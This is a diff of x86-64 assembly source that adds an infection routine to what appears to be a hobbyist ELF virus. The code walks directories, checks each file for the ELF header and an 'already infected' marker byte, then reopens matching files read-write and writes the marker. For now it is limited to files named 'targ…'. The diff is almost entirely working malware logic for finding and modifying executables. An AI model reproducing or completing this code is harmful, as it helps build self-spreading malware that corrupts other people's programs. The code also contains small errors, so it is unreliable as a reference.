@@ -29,38 +29,73 @@ global _start
 
 section .text
 
+infect:
+	; # PROLOGUE
+	; # STACK
+	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
+	mov rbp, rsp ; ALIGN RBP TO RSP
+
+	; # BODY
+	; # OPEN
+	mov rax, 2 ; OPEN KERNEL CODE
+	mov rdi, r10 ; PATHNAME
+	mov rsi, 2 ; O_RDWR
+	syscall
+	mov r9, rax ; KEEP OUR FD IN R11 REG
+
+	mov rdi, rax
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, 9 ; OFFSET OF OUR CHECKBYTE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+
+	mov rax, 1 ; WRITE OUR CHECKBYTE MARK SO WE KNOW FILE IS INFECTED
+	mov rdi, r9 ; FD
+	push 0x01
+	lea rsi, [rsp]
+	mov rdx, 1 ; 1 CHAR
+	syscall
+
+	; # CLOSE
+	mov rdi, r9
+	mov rax, 3
+	syscall
+	; # EPILOGUE
+	; # STACK
+	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
+	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
+	ret ;
+
 analyse:
 	; # PROLOGUE
 	; # STACK
 	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
 	mov rbp, rsp ; ALIGN RBP TO RSP
-	; # EPILOGUE
 	mov rdi, rax ; fd
 	mov rax, 0 ; READ KERNEL CODE
 	; ; MAKE SPACE FOR BUFFER
-	sub rsp, 8
+	sub rsp, 10
 	mov rsi, rsp
-	mov rdx, 8 ; READ 8 BYTES
+	mov rdx, 10 ; READ 10 BYTES
 	syscall ;
 	;	0x7F	|	'E'	|	'L'	|	'F'	|	2 (64bits)
 	;	0			1		2		3	|	4
 	; # MUST CHECK FIRST 5 BYTES
-	cmp rax, 8 ; TO BE SURE WE HAVE ENOUGH BYTES
+	cmp rax, 10 ; TO BE SURE WE HAVE ENOUGH BYTES
 	jne _badFile
-	; mov rdi, qword[rsp]
 	mov rax, qword[rsp] ; GET FIRST 8 BYTES FROM BUFFER
 						;			0x00 01 01 02 46 4c 45 7f
 	shl rax, 12 ; SHIFT ADD 3 0 BYTES SO WE REACH 64BITS AND NEXT BITS WILL BE ERASED
 				; ->				0x10 10 24 64 c4 57 f0 00
 	shl rax, 12 ; ERASE 3x CHAR SO	0x02 46 4c 45 7f 00 00 00
 	mov rdi, rax
-	; mov rax, 0x0000007F454C4602 ; WE USE RAX FOR 64bits OPERATIONS
 	mov rax, 0x02464c457f000000
-	cmp rdi, rax
-	jne _badFile
-	call _debugPrint
-
-	; # STACK
+	cmp rdi, rax ; CHECK IF GOOD FILE HEADER
+	jne _badFile ; IF NOT, SKIP
+	cmp byte[rsp + 9], 0x00 ; CHECK OUR INFECTION BYTE
+	jne _badFile ; ALREADY INFECTED
+	; # GOOD FILE, LET'S GO MA BOYZ
+	call infect
 
 _badFile:
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
@@ -77,12 +112,15 @@ open_file:
 	; # OPEN
 	mov rax, 2 ; OPEN KERNEL CODE
 	mov rdi, rdx ; PATHNAME
+	mov r10, rdx ; FOR LATER ON INJECT
 	mov rsi, 0 ; O_RDONLY
 	cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
 							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
 	jne _prologue ; IF NOT "target" FILE, SKIP
 	syscall
 	; # ANALYSE FILE
+	cmp rax, 0 ; CHECK IF FD > 0
+	jbe _prologue
 	push rax
 	call analyse
 	; #
@@ -99,7 +137,6 @@ _prologue: ; # FOR TESTING ON TARGET, CONDITIONAL JUMP
 	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
 	ret ;
 
-
 search:
 	; # PROLOGUE
 	; # STACK
@@ -107,12 +144,15 @@ search:
 	mov rbp, rsp ; ALIGN RBP TO RSP
 
 	; # BODY
-	; # OPENAT CALL, TODO: CHECK RETURN VALUE
+	; # OPENAT CALL
 	mov rsi, rdi ; SEARCH ARG (PATHNAME)
 	mov rdi, -100 ; AT_FDCWD, start from current dir (relative path)
 	mov rdx, 0x90800 ; O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY
 	mov rax, 257 ; OPENAT KERNEL CODE
 	syscall
+	; # CHECK RETURN VALUE OF OPENAT
+	cmp rax, 0
+	jbe _parseEnd
 	; # GETDENTS CALL
 	mov rdi, rax ; FD FROM OPENAT
 	mov rax, 217 ; GETDENTS64 KERNEL CODE
@@ -159,6 +199,8 @@ parse_dir:
 	cmp qword[rdx - 8], 0x00 ; CHECK IF OFFSET TO NEXT STRUCT IS NULL
 	jne parse_dir ; IF NOT NULL KEEP LOOPING
 	; #########
+
+_parseEnd:
 	; # EPILOGUE
 	; # STACK
 	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
